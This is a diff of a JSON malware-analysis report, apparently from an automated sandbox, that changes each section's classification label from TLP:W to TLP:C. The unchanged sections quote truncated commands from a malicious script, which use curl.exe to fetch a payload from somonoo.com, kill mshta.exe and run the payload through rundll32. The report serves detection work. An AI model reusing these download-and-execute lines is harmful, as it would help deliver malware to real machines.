@@ -7,7 +7,7 @@
         "auto_collapse": false,
         "body": "Sample uses a combination of both Visual Basic and JavaScript",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": null,
         "tags": {},
@@ -18,7 +18,7 @@
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"somonoo.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://somonoo.com/6wb/i.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/6wb/i.gif\"}]",
         "body_format": "TABLE",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -52,7 +52,7 @@
         "auto_collapse": false,
         "body": null,
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": null,
         "tags": {},
@@ -63,7 +63,7 @@
         "auto_collapse": false,
         "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)\n\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tActiveXObject(wscript.shell)\n\n\t\tActiveXObject(shell.application)\n\n\t\tvar axqKhseWy = new ActiveXObject('WScript.Shell')",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -85,7 +85,7 @@
         "auto_collapse": false,
         "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[15]()\n\n\t\tnew WScript.Shell[17]()\n",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -107,7 +107,7 @@
         "auto_collapse": false,
         "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[17].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[17].run(\"taskkill /f /im mshta.exe\", 0)\n",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -129,7 +129,7 @@
         "auto_collapse": false,
         "body": "JavaScript runs code via shell\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[17].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[17].run(\"taskkill /f /im mshta.exe\", 0)\n",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -151,7 +151,7 @@
         "auto_collapse": false,
         "body": "JavaScript runs code via shell application\n\t\tShell.Application[18].shellexecute(\"rundll32\", \"C:\\ProgramData\\aj0iG.png,Wind\", \"\", \"open\", 3)\n",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -173,7 +173,7 @@
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"google.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://google.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"somonoo.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://somonoo.com/6wb/i.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/6wb/i.gif\"}]",
         "body_format": "TABLE",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": {
           "attack_ids": [],
@@ -207,7 +207,7 @@
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"somonoo.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://somonoo.com/6wb/i.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/6wb/i.gif\"}]",
         "body_format": "TABLE",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": {
           "attack_ids": [],
@@ -241,7 +241,7 @@
         "auto_collapse": false,
         "body": "\t\tAn encoded literal was found: 685bfde03eb646c27ed565881917c71c",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": {
           "attack_ids": [],
